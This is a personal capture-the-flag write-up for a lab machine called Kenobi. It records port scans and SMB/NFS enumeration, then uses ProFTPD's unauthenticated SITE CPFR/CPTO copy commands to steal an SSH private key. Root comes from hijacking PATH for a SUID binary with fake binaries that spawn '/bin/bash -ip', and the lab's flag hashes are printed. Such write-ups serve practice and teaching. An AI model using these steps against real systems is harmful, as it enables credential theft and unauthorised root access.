---
title: Kenobi
tags:
  - fetus
---
## nmap results:
- `nmap IP`:
```
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
```
- `nmap -p- -Pn -T4 -A IP`:
```sh
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 10:04 EDT
Nmap scan report for 10.10.147.243
Host is up (0.22s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      47287/tcp6  mountd
|   100005  1,2,3      52055/udp   mountd
|   100005  1,2,3      52478/udp6  mountd
|   100005  1,2,3      59225/tcp   mountd
|   100021  1,3,4      34965/tcp   nlockmgr
|   100021  1,3,4      38076/udp   nlockmgr
|   100021  1,3,4      43356/udp6  nlockmgr
|   100021  1,3,4      43659/tcp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs         2-4 (RPC #100003)
34965/tcp open  nlockmgr    1-4 (RPC #100021)
35355/tcp open  mountd      1-3 (RPC #100005)
36423/tcp open  mountd      1-3 (RPC #100005)
59225/tcp open  mountd      1-3 (RPC #100005)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 2 hops
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-04-11T14:26:14
|_  start_date: N/A
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h40m00s, deviation: 2h53m13s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2025-04-11T09:26:14-05:00

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   214.12 ms 10.21.0.1
2   214.11 ms 10.10.147.243

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1334.73 seconds
```

## http enum: 
- nothing showed up. got a directory from directory busting but it was a trap lol
## ftp enum 1: 
- ftp anon login didnt work 
- got the version tho. has a vulnerability where it lets you copy files from any destination to any other destination within the server without needing to be authenticated. this can be done by running `SITE CPFR path` and then `SITE CPTO path`
## [[smb]] enum: 
- `smbmap -H 10.10.214.169`:
```
[+] IP: 10.10.214.169:445       Name: 10.10.214.169             Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (kenobi server (Samba, Ubuntu))
```
- lets check out the anonymous share with `smbclient` 
- got `log.txt`:
- [[kenobiLog.txt]] 
- apparently the ssh `id_rsa` got stored at `/home/kenobi/.ssh/id_rsa` and we got a user called `kenobi` as well
- gonna run an ssh bruteforce against `kenobi` while i enumerate further
## [[NFS]] enum:
- nfs is running. lets see what we got with [[showmount]]
- the `/var` directory is shared. lets [[mount]] it
- `mount -t nfs 10.10.56.98:/var /mnt/kenobi`
- lets see whats in there 
- `tree -L 3 /mnt/kenobi`<br>
```sh fold title:"treeOutput"
/mnt/kenobi
├── backups
│   └── apt.extended_states.0
├── cache
│   ├── apache2
│   │   └── mod_cache_disk
│   ├── apparmor
│   ├── apt
│   │   ├── archives
│   │   ├── pkgcache.bin
│   │   └── srcpkgcache.bin
│   ├── debconf
│   │   ├── config.dat
│   │   ├── config.dat-old
│   │   ├── passwords.dat
│   │   ├── templates.dat
│   │   └── templates.dat-old
│   ├── ldconfig  [error opening dir]
│   ├── samba
│   │   ├── browse.dat
│   │   ├── gencache.tdb
│   │   └── printing
│   └── snapd
│       ├── commands.db
│       ├── names
│       └── sections
├── crash
├── lib
│   ├── apache2
│   │   ├── conf
│   │   ├── module
│   │   └── site
│   ├── apparmor
│   │   └── profiles
│   ├── apt
│   │   ├── cdroms.list
│   │   ├── cdroms.list~
│   │   ├── daily_lock
│   │   ├── extended_states
│   │   ├── keyrings
│   │   ├── lists
│   │   ├── mirrors
│   │   └── periodic
│   ├── dbus
│   │   └── machine-id
│   ├── dhcp
│   │   ├── dhclient.enp0s3.leases
│   │   └── dhclient.eth0.leases
│   ├── dpkg
│   │   ├── alternatives
│   │   ├── arch
│   │   ├── available
│   │   ├── cmethopt
│   │   ├── diversions
│   │   ├── diversions-old
│   │   ├── info
│   │   ├── lock
│   │   ├── lock-frontend
│   │   ├── parts
│   │   ├── statoverride
│   │   ├── statoverride-old
│   │   ├── status
│   │   ├── status-old
│   │   ├── triggers
│   │   └── updates
│   ├── git
│   ├── initramfs-tools
│   │   ├── 4.4.0-142-generic
│   │   └── 4.8.0-58-generic
│   ├── initscripts
│   ├── insserv
│   ├── locales
│   │   └── supported.d
│   ├── logrotate
│   ├── lxcfs
│   ├── lxd
│   │   └── unix.socket
│   ├── mdadm
│   │   └── mdadm.conf-generated
│   ├── misc
│   ├── nfs
│   │   ├── etab
│   │   ├── export-lock
│   │   ├── rmtab
│   │   ├── sm
│   │   ├── sm.bak
│   │   ├── state
│   │   ├── v4recovery
│   │   └── xtab
│   ├── os-prober
│   ├── pam
│   │   ├── account
│   │   ├── auth
│   │   ├── password
│   │   ├── seen
│   │   ├── session
│   │   └── session-noninteractive
│   ├── plymouth
│   ├── polkit-1  [error opening dir]
│   ├── python
│   │   └── python3.5_installed
│   ├── resolvconf
│   │   └── linkified
│   ├── samba
│   │   ├── account_policy.tdb
│   │   ├── group_mapping.tdb
│   │   ├── printers
│   │   ├── private
│   │   ├── registry.tdb
│   │   ├── share_info.tdb
│   │   └── usershares
│   ├── sgml-base
│   │   ├── supercatalog
│   │   └── supercatalog.old
│   ├── snapd
│   │   ├── apparmor
│   │   ├── assertions
│   │   ├── auto-import
│   │   ├── cookie
│   │   ├── desktop
│   │   ├── device
│   │   ├── environment
│   │   ├── firstboot
│   │   ├── lib
│   │   ├── snaps
│   │   ├── state.json
│   │   ├── system-key
│   │   └── void
│   ├── sudo
│   │   └── lectured
│   ├── systemd
│   │   ├── catalog
│   │   ├── clock
│   │   ├── coredump
│   │   ├── deb-systemd-helper-enabled
│   │   ├── random-seed
│   │   └── timers
│   ├── ubuntu-release-upgrader
│   │   └── release-upgrade-available
│   ├── ucf
│   │   ├── cache
│   │   ├── hashfile
│   │   ├── hashfile.0
│   │   ├── hashfile.1
│   │   ├── hashfile.2
│   │   ├── hashfile.3
│   │   ├── hashfile.4
│   │   ├── hashfile.5
│   │   ├── hashfile.6
│   │   ├── hashfile.7
│   │   ├── registry
│   │   ├── registry.0
│   │   ├── registry.1
│   │   ├── registry.2
│   │   ├── registry.3
│   │   └── registry.4
│   ├── update-manager
│   │   └── meta-release-lts
│   ├── update-notifier
│   │   ├── dpkg-run-stamp
│   │   ├── fsck-at-reboot
│   │   ├── package-data-downloads
│   │   ├── updates-available
│   │   └── user.d
│   ├── update-rc.d
│   ├── urandom
│   │   └── random-seed
│   ├── ureadahead
│   │   └── debugfs
│   ├── usbutils
│   │   └── usb.ids
│   ├── vim
│   │   └── addons
│   └── xml-core
│       ├── catalog
│       └── xml-core
├── local
├── lock -> /run/lock
├── log
│   ├── alternatives.log
│   ├── apache2  [error opening dir]
│   ├── apt
│   │   ├── history.log
│   │   └── term.log
│   ├── auth.log
│   ├── bootstrap.log
│   ├── btmp
│   ├── dist-upgrade
│   ├── dmesg
│   ├── dpkg.log
│   ├── faillog
│   ├── fsck
│   │   ├── checkfs
│   │   └── checkroot
│   ├── installer
│   │   ├── cdebconf
│   │   ├── hardware-summary
│   │   ├── initial-status.gz
│   │   ├── lsb-release
│   │   ├── media-info
│   │   ├── partman
│   │   ├── status
│   │   └── syslog
│   ├── kern.log
│   ├── lastlog
│   ├── lxd
│   ├── samba  [error opening dir]
│   ├── syslog
│   ├── unattended-upgrades  [error opening dir]
│   └── wtmp
├── mail
├── opt
├── run -> /run
├── snap
├── spool
│   ├── cron
│   │   ├── atjobs
│   │   ├── atspool
│   │   └── crontabs
│   ├── mail -> ../mail
│   ├── rsyslog  [error opening dir]
│   └── samba
├── tmp
│   ├── systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM  [error opening dir]
│   ├── systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw  [error opening dir]
│   ├── systemd-private-7c89902dad6a49058ad209f2e37f5eab-systemd-timesyncd.service-5wgQt4  [error opening dir]
│   └── systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn  [error opening dir]
└── www
    └── html
        ├── admin.html
        ├── image.gif
        ├── image.jpg
        ├── index.html
        └── robots.txt
```

- lots of stuff. but i wanna get my hands on that `id_rsa` real quick first 
- moved it into `/var/tmp` with the vulnerability and copied it into my system. lets see if i can login with this or if it asks for a passphrase
- yaaay got in as kenobi. lets priv esc
- got `user.txt`:<br>
```
d0b0f3f53b6caa532a83915e19224899
```
- didnt find anything else that was interesting, dont know the actual creds for kenobi either. found these bins with their SUID set: 
```
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```
- cant really run sudo priv escs since the creds are unknown. oh and ill try running linpeas as well ig???
- `/usr/bin/menu (Unknown SUID binary!)`
- hmm lets see what it does
- tried `ltrace` but its not available 
- catted the file. lots of gibberish
- used `strings`. lots of stuff 
```
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.7594
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
menu.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
__stack_chk_fail@@GLIBC_2.4
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
_Jv_RegisterClasses
__isoc99_scanf@@GLIBC_2.7
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment
```
- ooh it runs `uname`, `ifconfig` and `curl` but the proper path isnt set. lets try to priv esc with these with some PATH manipulation
- first lets append `/tmp` at the beginning of the `PATH` system variable so the system checks there first by running `export PATH=/tmp:$PATH`
- lets echo it just to be sure it got added 
```
/tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```
- yup its there. lets make some dummy binaries at `/tmp` and echo `/bin/bash -ip` in em and give em 777 perms 
- lets run `menu` now 
- yup got root 
	- why:    menu has its `SUID` set for root so any command `menu` itself runs gets ran as root as well. and since it runs `ifconfig`,`curl` and `uname` as root but doesnt seem to have the actual binary locations set up. the first match the system finds in any of the locations in the `PATH` system variable is the one that gets run as root. and we modified the `PATH` variable and added the `/tmp` directory there so the `/tmp` directory is the first location the system checks for those binaries when `menu` tries to use them. and since we made dummy binaries with the same name in `/tmp`, the system runs them as root through `menu`. and because all the dummy files just have the command `/bin/bash -ip` in them and nothing else, thats what actually gets ran and gives us a partial root bash shell (we can priv esc to full root just by running `sudo su` in this case). 
- got `root.txt`:
```
177b3cd8562289f37382721c28381f02
```
